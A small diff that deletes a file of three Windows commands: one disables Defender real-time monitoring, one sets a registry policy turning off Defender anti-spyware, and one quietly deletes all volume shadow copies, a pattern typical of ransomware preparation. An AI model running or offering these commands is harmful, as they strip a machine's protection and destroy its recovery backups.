@@ -1,5 +1,0 @@
-Set-MpPreference -DisableRealtimeMonitoring $true
-
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /t REG_WORD /v DisableAntiSpyware /f /d 1
-
-vssadmin.exe delete shadows /all /quiet
